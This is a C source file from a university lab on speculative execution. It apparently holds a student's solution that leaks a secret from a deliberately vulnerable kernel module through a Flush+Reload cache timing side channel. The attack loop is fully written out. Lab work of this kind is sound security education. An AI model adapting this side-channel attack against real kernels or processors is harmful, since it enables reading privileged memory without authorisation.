/*
 * Lab 2 for Securing Processor Architectures - Fall 2022
 * Exploiting Speculative Execution
 *
 * Part 2
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "lab2.h"
#include "lab2ipc.h"

/*
 * call_kernel_part2
 * Performs the COMMAND_PART2 call in the kernel
 *
 * Arguments:
 *  - kernel_fd: A file descriptor to the kernel module
 *  - shared_memory: Memory region to share with the kernel
 *  - offset: The offset into the secret to try and read
 */
static inline void call_kernel_part2(int kernel_fd, char *shared_memory, size_t offset) {
    lab2_command local_cmd;
    local_cmd.kind = COMMAND_PART2;
    local_cmd.arg1 = (uint64_t)shared_memory;
    local_cmd.arg2 = offset;

    write(kernel_fd, (void *)&local_cmd, sizeof(local_cmd));
}

/*
 * run_attacker
 *
 * Arguments:
 *  - kernel_fd: A file descriptor referring to the lab 2 vulnerable kernel module
 *  - shared_memory: A pointer to a region of memory shared with the server
 */
int run_attacker(int kernel_fd, char *shared_memory) {
    char leaked_str[LAB2_SECRET_MAX_LEN];
    size_t current_offset = 0;
    size_t flush_offset;
    uint64_t dram_latency_bf,dram_latency;
    volatile char load_shared_mem;

    int repeat;
    int same_twice;

    printf("Launching attacker\n");

    //Flushing the memory here
    for (flush_offset = 0; flush_offset < LAB2_SHARED_MEMORY_SIZE; flush_offset += 1) {
        load_shared_mem = (char)(shared_memory+flush_offset);
        //dram_latency_bf = time_access((void*)(shared_memory+flush_offset));
        clflush((void*)(shared_memory+flush_offset));
        //dram_latency = time_access((void*)(shared_memory+flush_offset));
        //printf("\n This is the latency before flush %li and after flush %li", dram_latency_bf,dram_latency);
    }

    for (current_offset = 0; current_offset < LAB2_SECRET_MAX_LEN; current_offset++) {
        char leaked_byte;
        repeat = 1;

        // [Part 1]- Fill this in!
        // Feel free to create helper methods as necessary.
        // Use "call_kernel_part1" to interact with the kernel module
        // Find the value of leaked_byte for offset "current_offset"
        // leaked_byte = ??

        while (repeat)
        {
            for (same_twice = 0; same_twice < 10; same_twice++) {
                call_kernel_part2(kernel_fd, shared_memory, 0);
            }

            for (flush_offset = 0; flush_offset < LAB2_SHARED_MEMORY_SIZE; flush_offset += 1) {
                load_shared_mem = (char)(shared_memory+flush_offset);
                //dram_latency_bf = time_access((void*)(shared_memory+flush_offset));
                clflush((void*)(shared_memory+flush_offset));
                //dram_latency = time_access((void*)(shared_memory+flush_offset));
                //printf("\n This is the latency before flush %li and after flush %li", dram_latency_bf,dram_latency);
            }

            /* code */
            //Use call kernel to access data
            call_kernel_part2(kernel_fd, shared_memory, current_offset);

            //Reload and measure time and Decode the transmission to get data
            for (flush_offset = 0; flush_offset <  LAB2_SHARED_MEMORY_SIZE; flush_offset += 4096) {
                dram_latency = time_access((void*)(shared_memory+flush_offset));
                clflush((void*)(shared_memory+flush_offset));
                if (dram_latency < 90){
                    leaked_byte = (char)(flush_offset / LAB2_PAGE_SIZE);
                    repeat = 0;
                }
            }
        }

        leaked_str[current_offset] = leaked_byte;
        if (leaked_byte == '\x00') {
            break;
        }
    }

    printf("\n\n[Lab 2 Part 2] We leaked:\n%s\n", leaked_str);

    close(kernel_fd);
    return EXIT_SUCCESS;
}
